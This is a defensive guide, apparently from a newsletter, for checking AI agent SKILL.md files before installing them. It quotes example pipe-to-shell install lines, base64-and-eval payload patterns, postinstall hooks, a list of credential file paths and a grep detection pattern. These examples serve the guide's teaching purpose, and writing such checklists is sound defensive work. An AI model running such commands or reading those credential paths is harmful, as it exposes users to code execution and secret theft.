# The SKILL.md red-flag checklist

Thirty seconds per skill, before you install it.

A skill is not an app. `SKILL.md` is an instruction file your agent reads and
follows, and most skills ship an install line that runs on your machine with
your permissions. Installing one is closer to piping a stranger's script into
`bash` than to installing software from a store.

So: open the file first. Here is exactly what to look for.

---

## The four flags

### 1. A pipe straight into a shell

```
curl -fsSL https://example.com/install.sh | bash
wget -qO- https://example.com/i.sh | sh
iwr -useb https://example.com/i.ps1 | iex
```

**Why it's bad:** you never see what runs. The server can serve one thing to a
browser and another to `curl`, so "I checked the URL" proves nothing. It also
runs as you — same file access, same keys, same tokens.

**What good looks like:** the skill tells you to download the script, then run
it as a separate step. Two commands instead of one is the whole difference.

### 2. Anything base64 (or hex, or `eval`)

```
echo aGVsbG8gd29ybGQ= | base64 -d | bash
eval "$(printf '\x63\x75\x72\x6c ...')"
python -c "exec(__import__('base64').b64decode('...'))"
```

**Why it's bad:** there is no legitimate reason for an install step to hide what
it says. Encoding is there to get a payload past your eyes and past a reviewer's
`grep`. Decode it before you decide — `base64 -d` on its own, with no pipe into
a shell.

### 3. A post-install hook

```jsonc
// package.json
"scripts": { "postinstall": "node ./scripts/setup.js" }
```
```python
# setup.py
cmdclass={'install': CustomInstall}
```

**Why it's bad:** it runs on `npm install` / `pip install` without you typing
anything. You think you're fetching a dependency; you're executing the author's
code. This is the single most-used route in real package-ecosystem attacks.

**What good looks like:** setup you invoke yourself, after you've read it.

### 4. Anything reaching for credentials

```
~/.ssh/id_rsa      ~/.ssh/id_ed25519     ~/.aws/credentials
~/.config/gh/hosts.yml                   ~/.npmrc
security find-generic-password           # macOS keychain
~/.config/gcloud/                        .env
```

**Why it's bad:** a skill that formats your commits has no business reading your
SSH keys. Credential paths in an install script are the payload, not a feature.
Pair this with any outbound request (`curl -X POST`, a webhook URL, an IP
literal) and you are looking at exfiltration.

---

## The thirty-second pass

Open `SKILL.md` and any install script it points at, then:

```bash
grep -nEi 'curl|wget|\| *(ba)?sh|iex|base64|eval|exec\(|postinstall|preinstall|\.ssh|credentials|keychain|\.npmrc|\.env' SKILL.md install.sh
```

Nothing back? Install it. Something back? Read that line and decide — some are
fine in context (a skill that *is* a deploy tool will legitimately touch
credentials, and should say so in plain words at the top).

The rule that survives every case: **if the install step hides what it does,
that is the finding.** You do not need to prove intent.

---

## Pick the skill before you audit it

Auditing is step two. Step one is not browsing a directory of tens of thousands
of skills and guessing.

```
/plugin marketplace add vercel-labs/find-skills
```

Then describe the job — "I need something that reviews my SQL migrations" — and
it fetches the skill that fits. `find-skills` is the most-installed skill in the
largest directory (3M installs, read from claudemarketplaces.com on 2026-08-21).

Pick it, then read it.

---

## Where the numbers come from

- **23,600+ Claude skills indexed** — claudemarketplaces.com/skills, read
  2026-08-21.
- **472 malicious skills flagged** on ClawHub — SlowMist's MistEye threat
  intelligence, published 2026-02-09. Corroborated by the detector set in
  github.com/smartchainark/skill-security-audit, which is built on it.
- **341 malicious of 2,857 total (11.9%, "almost 1 in 8")** on ClawHub — KOI
  Security.
- **One IP, `91.92.242.30`**, historically linked to the Poseidon group, tied
  several of them together — so this was coordinated, not scattered amateurs.

**Read this caveat.** ClawHub is the skill hub for OpenClaw. It is the hub that
got audited, and 1-in-8 is *its* rate. Nobody has published an equivalent audit
of the Claude skills directory, so that figure is not a measured rate for the
skills you install — it is the best evidence anyone has about what an unaudited
agent-skill hub looks like when someone finally looks. Treat it as a reason to
check, not as a statistic about Claude.

---

*From Vektor — the AI frontier, cut to what ships. One free Claude setup a day:
[@vektor.fm](https://instagram.com/vektor.fm)*
